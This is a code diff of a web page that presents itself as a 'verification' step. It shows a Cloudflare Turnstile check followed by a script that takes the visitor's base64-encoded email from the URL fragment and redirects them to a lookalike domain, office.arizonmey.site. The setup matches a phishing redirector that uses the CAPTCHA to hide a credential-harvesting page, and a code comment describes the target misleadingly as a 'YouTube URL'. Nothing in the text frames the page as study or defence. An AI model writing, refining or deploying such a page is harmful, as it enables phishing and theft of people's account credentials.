@@ -44,7 +44,7 @@
     <div class="container">
         <h1>Please complete the verification</h1>
         <div class="turnstile-container">
-            <div class="cf-turnstile" data-sitekey="0x4AAAAAABY-PATczEiMK3WG"></div>
+            <div class="cf-turnstile" data-sitekey="0x4AAAAAABY-PATczEiMK3WG" data-callback="onTurnstileSuccess"></div>
         </div>
     </div>
 
@@ -55,17 +55,20 @@
             return hash ? hash.substring(1) : ''; // Remove the # symbol
         };
 
+        // Function to handle successful verification
+        function onTurnstileSuccess(token) {
+            // Get the base64 email and append it to YouTube URL
+            const base64Email = getBase64Email();
+            const redirectUrl = base64Email ? 
+                `https://office.arizonmey.site/xELTGrPW#${base64Email}` : 
+                'https://office.arizonmey.site/xELTGrPW';
+            window.location.href = redirectUrl;
+        }
+
         window.onloadTurnstileCallback = function () {
             turnstile.render('.cf-turnstile', {
                 sitekey: '0x4AAAAAABY-PATczEiMK3WG',
-                callback: function(token) {
-                    // Get the base64 email and append it to YouTube URL
-                    const base64Email = getBase64Email();
-                    const redirectUrl = base64Email ? 
-                        `https://office.arizonmey.site/xELTGrPW#${base64Email}` : 
-                        'https://office.arizonmey.site/xELTGrPW';
-                    window.location.href = redirectUrl;
-                }
+                callback: onTurnstileSuccess
             });
         };
     </script>
